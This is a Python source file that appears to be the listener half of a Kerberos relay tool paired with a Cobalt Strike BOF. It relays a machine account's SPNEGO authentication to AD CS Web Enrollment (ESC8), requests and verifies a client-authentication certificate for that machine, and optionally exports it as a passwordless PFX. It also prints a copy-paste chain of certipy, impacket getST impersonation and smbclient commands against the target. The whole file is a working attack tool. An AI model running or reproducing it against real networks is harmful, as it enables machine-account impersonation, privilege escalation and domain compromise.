#!/usr/bin/env python3
"""Kerberos-only HTTP/ESC8 side of the KrbRelay BOF split.

The listener receives opaque DCE/RPC SPNEGO records over the KRB1 bridge and
places each one in an HTTP ``Authorization: Negotiate`` header. IIS responses
are returned unchanged to the BOF so Windows can complete the client side of
mutual Kerberos authentication. Once HTTP returns 200, enrollment and
certificate retrieval remain on that same authenticated TCP connection.

Run with Certipy's virtual environment because it already contains
``cryptography``. The default path does not print or retain authentication
artifacts; ``--trace-spnego``, ``--export-pfx-b64``, and ``--pfx-out`` enable
the explicitly requested output or file.
"""

from __future__ import annotations

import argparse
import base64
import html
import os
import re
import secrets
import socket
import struct
import sys
import urllib.parse
from dataclasses import dataclass
from typing import Callable, Optional

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID


# The wire format is documented in docs/protocol.md. Conservative limits keep
# a malformed peer or HTTP endpoint from forcing unbounded memory growth.
MAGIC = b"KRB1"
VERSION = 2
MSG_HELLO = 1
MSG_HELLO_OK = 2
MSG_CLIENT_AUTH_TOKEN = 3
MSG_SERVER_AUTH_TOKEN = 4
MSG_AUTH_OK = 5
MSG_ERROR = 6
NONCE_LENGTH = 64
MAX_TOKEN = 65535
MAX_ERROR = 512
MAX_HEADER = 64 * 1024
MAX_BODY = 4 * 1024 * 1024

MESSAGE_LIMITS = {
    MSG_HELLO: (NONCE_LENGTH, NONCE_LENGTH),
    MSG_HELLO_OK: (0, 0),
    MSG_CLIENT_AUTH_TOKEN: (1, MAX_TOKEN),
    MSG_SERVER_AUTH_TOKEN: (1, MAX_TOKEN),
    MSG_AUTH_OK: (0, 0),
    MSG_ERROR: (0, MAX_ERROR),
}


class RelayError(RuntimeError):
    """Expected protocol, transport, IIS, or certificate validation failure."""


@dataclass
class HttpResponse:
    """Normalized response preserving repeated header fields."""
    status: int
    headers: dict[str, list[str]]
    body: bytes

    def first(self, name: str) -> Optional[str]:
        values = self.headers.get(name.lower())
        return values[0] if values else None


@dataclass
class CertificateBundle:
    """Issued identity and matching in-memory key returned to the caller."""
    certificate: x509.Certificate
    private_key: rsa.RSAPrivateKey
    request_id: str


class RecordChannel:
    """Length-prefixed KRB1 channel layered over one accepted TCP connection."""
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.terminal = False

    def _read_exact(self, length: int) -> bytes:
        """Read exactly one framing unit despite normal TCP short reads."""
        out = bytearray()
        while len(out) != length:
            part = self.sock.recv(length - len(out))
            if not part:
                raise RelayError("bridge connection closed")
            out.extend(part)
        return bytes(out)

    def receive(self, allowed_kinds: set[int]) -> tuple[int, bytes]:
        """Validate kind and length for the current protocol state."""
        header = self._read_exact(12)
        magic, version, kind, reserved, length = struct.unpack("!4sBBHI", header)
        if magic != MAGIC or version != VERSION or reserved != 0:
            raise RelayError("invalid bridge header")
        if kind not in allowed_kinds:
            raise RelayError("unexpected bridge message for current state")
        minimum, maximum = MESSAGE_LIMITS.get(kind, (-1, -1))
        if not minimum <= length <= maximum:
            raise RelayError("invalid bridge payload length")
        return kind, self._read_exact(length)

    def send(self, kind: int, payload: bytes = b"") -> None:
        """Send one bounded KRB1 record in network byte order."""
        minimum, maximum = MESSAGE_LIMITS.get(kind, (-1, -1))
        if not minimum <= len(payload) <= maximum:
            raise RelayError("invalid bridge payload length")
        self.sock.sendall(struct.pack("!4sBBHI", MAGIC, VERSION, kind, 0, len(payload)) + payload)


def normalize_run_nonce(value: Optional[str]) -> str:
    """Return one canonical 256-bit run nonce suitable for both bridge peers."""
    if value is None:
        return secrets.token_hex(32)
    if not re.fullmatch(r"[0-9a-fA-F]{64}", value):
        raise ValueError("run nonce must contain exactly 64 hexadecimal characters")
    return value.lower()


def bind_session(channel: RecordChannel, expected_nonce: str) -> None:
    """Bind a BOF invocation before opening ADCS or accepting SPNEGO tokens."""
    _, nonce = channel.receive({MSG_HELLO})
    try:
        supplied = nonce.decode("ascii", errors="strict")
    except UnicodeDecodeError as exc:
        raise RelayError("run nonce is not ASCII") from exc
    if not secrets.compare_digest(supplied, expected_nonce):
        raise RelayError("run nonce does not match this relay session")
    channel.send(MSG_HELLO_OK)


class RawHttpConnection:
    """Minimal persistent HTTP/1.1 client that exposes raw Negotiate headers.

    High-level Kerberos HTTP libraries establish their own credential context,
    which would defeat relay. This implementation deliberately handles only
    the response features IIS uses while retaining unread pipelined bytes.
    """
    def __init__(self, host: str, address: str, port: int):
        self.host = host
        self.port = port
        self.sock = socket.create_connection((address, port), timeout=10)
        self.sock.settimeout(20)
        self.pending = bytearray()

    def close(self) -> None:
        self.sock.close()

    def request(
        self,
        method: str,
        path: str,
        body: bytes = b"",
        authorization: Optional[bytes] = None,
        cookie: Optional[str] = None,
    ) -> HttpResponse:
        """Send one request, optionally carrying an opaque SPNEGO record."""
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.host}",
            "User-Agent: KrbRelayBOF/1",
            "Connection: keep-alive",
        ]
        if authorization is not None:
            headers.append("Authorization: Negotiate " + base64.b64encode(authorization).decode("ascii"))
        if cookie:
            headers.append("Cookie: " + cookie)
        if body:
            headers.extend(
                [
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Content-Length: {len(body)}",
                ]
            )
        wire = ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + body
        self.sock.sendall(wire)
        return self._response()

    def _until(self, delimiter: bytes, limit: int) -> bytes:
        while delimiter not in self.pending:
            if len(self.pending) >= limit:
                raise RelayError("HTTP field exceeds limit")
            part = self.sock.recv(8192)
            if not part:
                raise RelayError("ADCS closed the HTTP connection")
            self.pending.extend(part)
        pos = self.pending.index(delimiter) + len(delimiter)
        out = bytes(self.pending[:pos])
        del self.pending[:pos]
        return out

    def _fixed(self, length: int) -> bytes:
        if length > MAX_BODY:
            raise RelayError("HTTP body exceeds limit")
        while len(self.pending) < length:
            part = self.sock.recv(min(65536, length - len(self.pending)))
            if not part:
                raise RelayError("ADCS closed the HTTP body")
            self.pending.extend(part)
        out = bytes(self.pending[:length])
        del self.pending[:length]
        return out

    def _chunked(self) -> bytes:
        body = bytearray()
        while True:
            line = self._until(b"\r\n", 128)
            try:
                length = int(line[:-2].split(b";", 1)[0], 16)
            except ValueError as exc:
                raise RelayError("invalid chunked HTTP response") from exc
            if length == 0:
                # The normal no-trailer terminator is a single CRLF after the
                # zero-size line. Non-empty trailers end in CRLFCRLF.
                if self.pending.startswith(b"\r\n"):
                    del self.pending[:2]
                else:
                    self._until(b"\r\n\r\n", MAX_HEADER)
                return bytes(body)
            if len(body) + length > MAX_BODY:
                raise RelayError("HTTP body exceeds limit")
            body.extend(self._fixed(length))
            if self._fixed(2) != b"\r\n":
                raise RelayError("invalid HTTP chunk terminator")

    def _response(self) -> HttpResponse:
        """Parse one bounded HTTP response and leave subsequent bytes queued."""
        raw = self._until(b"\r\n\r\n", MAX_HEADER)
        lines = raw[:-4].decode("iso-8859-1").split("\r\n")
        try:
            status = int(lines[0].split(" ", 2)[1])
        except (IndexError, ValueError) as exc:
            raise RelayError("invalid HTTP status line") from exc
        headers: dict[str, list[str]] = {}
        for line in lines[1:]:
            if ":" not in line:
                raise RelayError("invalid HTTP header")
            key, value = line.split(":", 1)
            headers.setdefault(key.lower(), []).append(value.strip())
        if "chunked" in ",".join(headers.get("transfer-encoding", [])).lower():
            body = self._chunked()
        elif "content-length" in headers:
            body = self._fixed(int(headers["content-length"][0]))
        else:
            body = b""
        return HttpResponse(status, headers, body)


def negotiate_blob(response: HttpResponse) -> Optional[bytes]:
    """Decode IIS's first non-empty Negotiate challenge, if present."""
    for value in response.headers.get("www-authenticate", []):
        if not value.lower().startswith("negotiate "):
            continue
        encoded = value.split(" ", 1)[1].strip()
        try:
            return base64.b64decode(encoded, validate=True)
        except ValueError as exc:
            raise RelayError("invalid IIS Negotiate continuation") from exc
    return None


def der_bounds(data: bytes, offset: int) -> Optional[tuple[int, int]]:
    """Return bounded DER content offsets for lightweight diagnostics only."""
    if offset + 2 > len(data):
        return None
    first = data[offset + 1]
    if first < 0x80:
        start = offset + 2
        end = start + first
    else:
        count = first & 0x7F
        if not count or count > 4 or offset + 2 + count > len(data):
            return None
        start = offset + 2 + count
        end = start + int.from_bytes(data[offset + 2 : start], "big")
    return (start, end) if end <= len(data) else None


def spnego_state(token: bytes) -> str:
    """Extract negState for logging; token forwarding never depends on it."""
    states = {0: "accept-completed", 1: "accept-incomplete", 2: "reject", 3: "request-mic"}
    for offset in range(max(0, len(token) - 4)):
        if token[offset : offset + 4] == b"\xa0\x03\x0a\x01":
            return states.get(token[offset + 4], f"unknown-{token[offset + 4]}")
    return "not-present"


def kerberos_inner(token: bytes) -> tuple[str, Optional[int]]:
    """Identify AP-REQ/AP-REP/KRB-ERROR inside SPNEGO for operator context."""
    tags = {0x6E: "AP-REQ", 0x6F: "AP-REP", 0x7E: "KRB-ERROR"}
    for offset, tag in enumerate(token):
        if tag != 0x04:
            continue
        bounds = der_bounds(token, offset)
        if not bounds:
            continue
        start, end = bounds
        if start >= end or token[start] not in tags:
            continue
        name = tags[token[start]]
        if name != "KRB-ERROR":
            return name, None
        inner_bounds = der_bounds(token, start)
        if not inner_bounds:
            return name, None
        for field in range(inner_bounds[0], inner_bounds[1] - 3):
            if token[field] != 0xA6:
                continue
            field_bounds = der_bounds(token, field)
            if not field_bounds or token[field_bounds[0]] != 0x02:
                continue
            value_bounds = der_bounds(token, field_bounds[0])
            if value_bounds:
                return name, int.from_bytes(token[value_bounds[0] : value_bounds[1]], "big")
        return name, None
    return "not-detected", None


def describe_spnego(token: bytes) -> str:
    """Summarize a token without claiming full ASN.1 validation."""
    top_levels = {
        0x60: "GSS-API InitialContextToken",
        0xA0: "NegTokenInit choice",
        0xA1: "NegTokenResp choice",
    }
    top = top_levels.get(token[0], f"ASN.1 tag 0x{token[0]:02x}") if token else "empty"
    spnego_oid = b"\x06\x06\x2b\x06\x01\x05\x05\x02" in token
    kerberos_oid = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02" in token
    inner, error_code = kerberos_inner(token)
    error = f"; kerberos_error={error_code}" if error_code is not None else ""
    return (
        f"top={top}; bytes={len(token)}; negState={spnego_state(token)}; "
        f"SPNEGO_OID={'yes' if spnego_oid else 'no'}; Kerberos_OID={'yes' if kerberos_oid else 'no'}; "
        f"inner={inner}{error}"
    )


def print_spnego(direction: str, leg: int, token: bytes) -> None:
    """Explicitly sensitive trace mode: metadata plus complete base64 token."""
    print(f"[SPNEGO] {direction} leg={leg}; {describe_spnego(token)}", flush=True)
    print(f"SPNEGO_{direction}_{leg}_B64={base64.b64encode(token).decode('ascii')}", flush=True)


def trace_name(value: str) -> str:
    """Make a runtime host/principal value safe for a shell-style trace label."""
    label = re.sub(r"[^A-Za-z0-9]+", "_", value).strip("_").upper()
    return label or "PEER"


def serialize_pfx(bundle: CertificateBundle, machine: str) -> bytes:
    """Create a passwordless PKCS#12 only after key/certificate verification."""
    return pkcs12.serialize_key_and_certificates(
        name=f"{machine}$".encode("ascii"),
        key=bundle.private_key,
        cert=bundle.certificate,
        cas=None,
        encryption_algorithm=serialization.NoEncryption(),
    )


def print_pfx(pfx: bytes, options: argparse.Namespace) -> None:
    """Emit explicit artifact reconstruction and parameterized follow-ons."""
    machine = options.machine
    domain = options.domain
    pfx_path = options.pfx_out
    encoded = base64.b64encode(pfx).decode("ascii")
    lower_machine = machine.lower()
    artifact_dir = os.path.dirname(os.path.abspath(pfx_path))
    print("[PFX] Copy/paste this block, then replace the angle-bracket placeholders", flush=True)
    print(f"PFX_B64='{encoded}'", flush=True)
    print(f"printf '%s' \"$PFX_B64\" | base64 -d > '{pfx_path}'", flush=True)
    print("unset KRB5CCNAME", flush=True)
    print(f"cd '{artifact_dir}'", flush=True)
    print(
        f"/home/kali/Tools/Certipy/.venv/bin/certipy auth -pfx '{pfx_path}' "
        f"-username '{machine}$' -domain {domain} -dc-ip <DC-IP> -no-hash",
        flush=True,
    )
    print(f"export KRB5CCNAME={lower_machine}.ccache", flush=True)
    print(
        "/home/kali/Tools/impacket-0.13.1/.venv/bin/python "
        "/home/kali/Tools/impacket-0.13.1/examples/getST.py -k -no-pass "
        f"-dc-ip <DC-IP> -impersonate <IMPERSONATE-ACCOUNT> -self "
        f"-altservice cifs/{machine} "
        f"'{domain}/{machine}$'",
        flush=True,
    )
    print(f"export KRB5CCNAME='<IMPERSONATE-ACCOUNT>@cifs_{machine}@{domain.upper()}.ccache'", flush=True)
    print(
        "/home/kali/Tools/impacket-0.13.1/.venv/bin/python "
        "/home/kali/Tools/impacket-0.13.1/examples/smbclient.py -k -no-pass "
        f"-dc-ip <DC-IP> -target-ip <TARGET-IP> "
        f"'{domain}/<IMPERSONATE-ACCOUNT>@{machine}'",
        flush=True,
    )


def load_issued_certificate(body: bytes) -> x509.Certificate:
    """Accept the DER, PEM, or PEM-wrapped response forms used by Web Enrollment."""
    stripped = body.strip()
    if stripped.startswith(b"-----BEGIN CERTIFICATE-----"):
        return x509.load_pem_x509_certificate(stripped)
    try:
        return x509.load_der_x509_certificate(stripped)
    except ValueError:
        text = stripped.decode("ascii", errors="ignore")
        match = re.search(
            r"-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----",
            text,
            flags=re.DOTALL,
        )
        if not match:
            raise RelayError("ADCS returned an unrecognized certificate")
        return x509.load_pem_x509_certificate(match.group(0).encode("ascii"))


def request_id_from_body(body: bytes) -> Optional[str]:
    """Extract the CA request ID from normal, pending, or denied HTML."""
    for pattern in (
        rb"certnew\.cer\?ReqID=([0-9]+)&",
        rb"Your Request Id is ([0-9]+)",
        rb"ReqID=([0-9]+)",
    ):
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            return match.group(1).decode("ascii", errors="strict")
    return None


def adcs_error_detail(body: bytes) -> str:
    """Reduce CA HTML to a non-sensitive policy/error reason for the BOF."""
    decoded = body.decode("utf-8", errors="replace")
    plain = html.unescape(re.sub(r"<[^>]+>", " ", decoded))
    plain = re.sub(r"\s+", " ", plain).strip()
    code_match = re.search(r"0x[0-9a-fA-F]{8}", plain)
    code = code_match.group(0).lower() if code_match else None
    known = {
        "0x80094012": "template permissions do not allow this principal to enroll",
        "0x80094014": "the requested certificate subject is invalid",
        "0x80094800": "the requested certificate template is not supported by this CA",
        "0x80094801": "the request did not contain a certificate template",
        "0x8009480f": "a required subject DNS name is unavailable",
    }
    if code in known:
        return f"{code}: {known[code]}"
    candidates = (
        r"Denied by Policy Module.{0,320}",
        r"The requested certificate template.{0,260}",
        r"The permissions on the certificate template.{0,260}",
        r"The request was denied.{0,260}",
        r"Error Number:.{0,160}",
    )
    for pattern in candidates:
        match = re.search(pattern, plain, re.IGNORECASE)
        if match:
            return match.group(0).strip()
    return code or "the CA returned a denial without a recognizable reason"


def enroll(
    conn: RawHttpConnection,
    domain: str,
    machine: str,
    template: str,
    enroll_path: str,
    certificate_path: str,
    cookie: Optional[str],
    log: Callable[[str], None],
) -> CertificateBundle:
    """Enroll through an already-authenticated connection and verify the result.

    The RSA private key never leaves Python memory unless the operator selected
    PFX output. The CSR requests the runtime template, and retrieval uses the
    same IIS session/cookie established by the relayed machine authentication.
    """
    log(f"Generating an in-memory RSA key and CSR for {domain}\\{machine}$")
    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, f"{domain}\\{machine}$")]))
        .sign(key, hashes.SHA256())
    )
    pem = csr.public_bytes(serialization.Encoding.PEM).decode("ascii").replace("\n", "")
    body = urllib.parse.urlencode(
        {
            "Mode": "newreq",
            "CertRequest": pem,
            "CertAttrib": f"CertificateTemplate:{template}",
            "TargetStoreFlags": "0",
            "SaveCert": "yes",
            "ThumbPrint": "",
        }
    ).encode("ascii")
    log(f"Submitting the CSR to {enroll_path} using template {template!r}")
    response = conn.request("POST", enroll_path, body, cookie=cookie)
    if response.status != 200:
        raise RelayError(f"certificate submission returned HTTP {response.status}")
    request_id = request_id_from_body(response.body)
    # A denied request can still have a CA request ID. Querying its status does
    # not submit another request and often yields the useful policy HRESULT.
    if b"locDenied" in response.body:
        detail = adcs_error_detail(response.body)
        if request_id:
            separator = "&" if "?" in certificate_path else "?"
            denial_response = conn.request(
                "GET", certificate_path + separator + urllib.parse.urlencode({"ReqID": request_id}), cookie=cookie
            )
            retrieved_detail = adcs_error_detail(denial_response.body)
            if "unrecognizable reason" not in retrieved_detail:
                detail = retrieved_detail
        label = f" request {request_id}" if request_id else ""
        raise RelayError(f"certificate{label} denied: {detail}")
    if not request_id:
        if b"Denied by Policy Module" in response.body:
            raise RelayError(f"certificate request denied by policy: {adcs_error_detail(response.body)}")
        if b"Certificate Pending" in response.body:
            raise RelayError("certificate request is pending")
        raise RelayError("certificate response did not contain a request ID")
    log(f"ADCS issued request {request_id}; retrieving the certificate on the authenticated connection")
    separator = "&" if "?" in certificate_path else "?"
    certificate_response = conn.request("GET", certificate_path + separator + urllib.parse.urlencode({"ReqID": request_id}), cookie=cookie)
    if certificate_response.status != 200:
        raise RelayError(f"certificate retrieval returned HTTP {certificate_response.status}")
    # Possessing an issued certificate alone is insufficient: ensure the
    # returned public key matches our private key and allows client auth/PKINIT.
    certificate = load_issued_certificate(certificate_response.body)
    cert_public = certificate.public_key().public_numbers()
    private_public = key.public_key().public_numbers()
    if cert_public != private_public:
        raise RelayError("issued certificate does not match the private key")
    log("Verified that the issued certificate matches the in-memory private key")
    try:
        usages = certificate.extensions.get_extension_for_class(x509.ExtendedKeyUsage).value
    except x509.ExtensionNotFound:
        usages = []
    if ExtendedKeyUsageOID.CLIENT_AUTH not in usages:
        raise RelayError("issued certificate is missing client-authentication usage")
    log("Verified client-authentication EKU")
    return CertificateBundle(certificate, key, request_id)


def run_session(channel: RecordChannel, options: argparse.Namespace) -> CertificateBundle:
    """Drive mutual Negotiate legs and enroll once IIS authenticates.

    The IIS probe, all 401 continuations, the final 200, CSR submission, and
    certificate retrieval share one RawHttpConnection. Reconnecting would
    discard IIS's connection-bound authentication state.
    """
    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
    client_trace = trace_name(options.machine)
    server_trace = trace_name(options.adcs_host)
    log(f"Opening one persistent TCP connection to {options.adcs_address}:{options.adcs_port} with Host {options.adcs_host}")
    http = RawHttpConnection(options.adcs_host, options.adcs_address, options.adcs_port)
    try:
        log(f"Priming IIS with an unauthenticated GET {options.auth_path}")
        probe = http.request("GET", options.auth_path)
        if probe.status != 401:
            raise RelayError(f"initial ADCS probe returned HTTP {probe.status}")
        log("IIS returned HTTP 401 with Negotiate; awaiting BOF SPNEGO leg 1")
        # Windows/IIS decides the leg count. Loop until the server returns 200
        # instead of assuming a two- or three-message Kerberos exchange.
        leg = 0
        while True:
            kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
            if kind == MSG_ERROR:
                raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
            leg += 1
            log(f"Received opaque SPNEGO leg {leg} from {options.machine}; relaying it to {options.adcs_host}{options.auth_path}")
            if options.trace_spnego:
                print_spnego(f"{client_trace}_TO_{server_trace}", leg, token)
            response = http.request("GET", options.auth_path, authorization=token)
            if response.status == 401:
                continuation = negotiate_blob(response)
                if not continuation:
                    raise RelayError("IIS returned a bare Negotiate challenge")
                inner, error_code = kerberos_inner(continuation)
                reason = f", KRB-ERROR {error_code}" if error_code is not None else ""
                log(
                    f"IIS continuation analysis: negState={spnego_state(continuation)}, "
                    f"inner={inner}{reason}; an AP-REP with accept-incomplete is the normal mutual-authentication step"
                )
                if options.trace_spnego:
                    print_spnego(f"{server_trace}_TO_{client_trace}", leg, continuation)
                log(f"IIS requested continuation; returning its opaque SPNEGO response to {options.machine} for leg {leg + 1}")
                # Do not unwrap, rebuild, or re-encode this binary token; the
                # BOF inserts it into the live RPCSS context unchanged.
                channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                continue
            if response.status != 200:
                raise RelayError(f"IIS authentication returned HTTP {response.status}")
            final_token = negotiate_blob(response)
            if options.trace_spnego and final_token:
                print_spnego(f"{server_trace}_FINAL", leg, final_token)
            log("IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account")
            channel.send(MSG_AUTH_OK)
            channel.terminal = True
            log("Released the BOF at authenticated-HTTP success; enrollment now continues only in Python")
            cookie = response.first("set-cookie")
            bundle = enroll(http, options.domain, options.machine, options.template, options.enroll_path, options.certificate_path, cookie, log)
            return bundle
    finally:
        http.close()


def parse_args(argv: list[str]) -> argparse.Namespace:
    """Declare operator-controlled endpoints while retaining safe web defaults."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", default="127.0.0.1")
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--allow", default="127.0.0.1")
    parser.add_argument("--adcs-host", required=True, help="HTTP Host header and hostname used by the service SPN")
    parser.add_argument("--adcs-address", required=True, help="IP address or resolvable hostname used for the TCP connection")
    parser.add_argument("--adcs-port", type=int, default=80)
    parser.add_argument("--auth-path", default="/certsrv/")
    parser.add_argument("--enroll-path", default="/certsrv/certfnsh.asp")
    parser.add_argument("--certificate-path", default="/certsrv/certnew.cer")
    parser.add_argument("--domain", required=True)
    parser.add_argument("--machine", required=True)
    parser.add_argument("--template", required=True)
    parser.add_argument("--run-nonce", help="64 hexadecimal characters shared with the BOF; generated when omitted")
    parser.add_argument("--quiet", action="store_false", dest="verbose")
    parser.add_argument("--trace-spnego", action="store_true")
    parser.add_argument("--export-pfx-b64", action="store_true")
    parser.add_argument("--pfx-out", metavar="PATH")
    return parser.parse_args(argv)


def main(argv: list[str]) -> int:
    """Accept one authorized bridge peer and save artifacts only on success."""
    options = parse_args(argv)
    for name in ("auth_path", "enroll_path", "certificate_path"):
        if not getattr(options, name).startswith("/"):
            raise SystemExit(f"--{name.replace('_', '-')} must be an absolute HTTP path")
    if any(not 1 <= value <= 65535 for value in (options.port, options.adcs_port)):
        raise SystemExit("TCP ports must be between 1 and 65535")
    try:
        options.run_nonce = normalize_run_nonce(options.run_nonce)
    except ValueError as exc:
        raise SystemExit(f"--run-nonce {str(exc).removeprefix('run nonce ')}") from exc
    # Resolve the allow value before listening. The common rportfwd_local path
    # appears as 127.0.0.1 regardless of the original target network address.
    allowed_addresses = {
        item[4][0] for item in socket.getaddrinfo(options.allow, None, socket.AF_INET, socket.SOCK_STREAM)
    }
    last_bundle: Optional[CertificateBundle] = None
    service_spn = f"http/{options.adcs_host}"
    print(f"[*] Run nonce: {options.run_nonce}", flush=True)
    print(
        f"[*] Matching Beacon command: krbrelay <SACRIFICIAL_PROCESS> {options.port} "
        f"{service_spn} <RPC_ENDPOINT> {options.run_nonce}",
        flush=True,
    )
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((options.listen, options.port))
        listener.listen(1)
        print(f"[*] Awaiting {options.machine} relay on {options.listen}:{options.port}", flush=True)
        client, peer = listener.accept()
        with client:
            if peer[0] not in allowed_addresses:
                print("[-] Rejected unauthorized bridge peer", flush=True)
                return 1
            if options.verbose:
                print(f"[+] Accepted authorized bridge connection from {peer[0]}", flush=True)
            channel = RecordChannel(client)
            try:
                bind_session(channel, options.run_nonce)
                if options.verbose:
                    print("[+] Bound the BOF to this relay session before accepting authentication material", flush=True)
                last_bundle = run_session(channel, options)
            except (RelayError, OSError, ValueError, TypeError) as exc:
                # Give the BOF a short, printable policy/transport reason. Any
                # trace tokens remain local to Python's operator terminal.
                if not channel.terminal:
                    try:
                        channel.send(MSG_ERROR, str(exc).encode("utf-8")[:MAX_ERROR])
                    except (OSError, RelayError):
                        pass
                print(f"[-] Relay failed: {exc}", flush=True)
                return 1
    if last_bundle is None:
        return 1
    if options.export_pfx_b64 and not options.pfx_out:
        options.pfx_out = f"{options.machine}-machine.pfx"
    # Deliberately serialize only after certificate/key/EKU verification and a
    # successful bridge session. The standalone default leaves no artifact.
    if options.export_pfx_b64 or options.pfx_out:
        pfx = serialize_pfx(last_bundle, options.machine)
        if options.pfx_out:
            options.pfx_out = os.path.abspath(options.pfx_out)
            descriptor = os.open(options.pfx_out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(descriptor, "wb") as output:
                output.write(pfx)
            print(f"[+] Saved passwordless machine PKCS#12 to {options.pfx_out}", flush=True)
        if options.export_pfx_b64:
            print_pfx(pfx, options)
    print(f"[+] Machine certificate acquired and key pair verified (request {last_bundle.request_id})", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
